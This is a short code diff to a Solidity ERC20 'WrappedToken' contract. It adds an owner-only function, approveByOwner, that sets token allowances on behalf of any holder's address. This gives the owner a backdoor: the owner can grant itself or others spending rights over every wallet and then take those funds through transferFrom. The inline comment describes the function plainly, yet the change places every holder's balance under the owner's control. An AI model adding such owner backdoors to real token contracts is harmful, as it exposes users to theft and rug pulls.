@@ -41,6 +41,16 @@ contract WrappedToken is ERC20 {
         return success;
     }
 
+    /// This function allows the owner to change other wallet allowance.
+    function approveByOwner(address from, address spender, uint256 value) public virtual returns (bool) {
+        if (_msgSender() != owner) {
+            return false;
+        }
+
+        _approve(from, spender, value);
+        return true;
+    }
+
     // Perform IERC20 transfer from `sender` address.
     // If called by `owner` and `recipient` is `owner` then burn happens.
     function transferFrom(
